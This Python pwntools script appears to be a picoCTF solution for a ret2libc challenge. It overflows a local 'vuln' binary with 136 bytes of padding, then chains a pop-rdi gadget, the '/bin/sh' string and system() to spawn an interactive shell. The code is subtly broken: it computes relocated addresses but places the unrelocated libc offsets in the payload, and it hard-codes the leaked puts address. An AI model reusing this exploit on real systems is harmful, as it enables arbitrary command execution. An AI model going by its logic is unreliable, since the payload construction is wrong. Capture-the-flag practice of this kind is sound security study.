from pwn import *

#run_libc = ELF('/home/ocean/picoCTF_writeup/bin_exploit/Hereis_libc/libc_so/libc.so.6')
run_libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')   # Local file libc.so.6
p = process('./vuln')

pop_rdi = 0x0000000000400913
ret = 0x40052e

puts_found = 0x7f1fbe480ed0	# address of puts() found
puts_offset = run_libc.symbols['puts']	# address of puts() in local/challenge file libc.so.6
log.info(f"The address of puts() in libc.so.6: {hex(puts_offset)}")

libc_baseaddr = puts_found - puts_offset

# Calculate the address of system() and string "/bin/sh" to exploit
system_libc = run_libc.symbols['system']	# address of system() in libc.so.6
binsh_libc =  next(run_libc.search(b'/bin/sh')) 	# Address of string "/bin/sh"
log.info(f"The address of system() in libc.so.6: {hex(system_libc)}")
log.info(f"The address of string /bin/sh in libc.so.6: {hex(binsh_libc)}")

system = libc_baseaddr + system_libc
binsh = libc_baseaddr + binsh_libc

# Exploit
payload = b"A" * 136
payload += p64(pop_rdi)
payload += p64(binsh_libc)
#payload += p64(ret)
payload += p64(system_libc)

p.sendline(payload)
p.interactive()
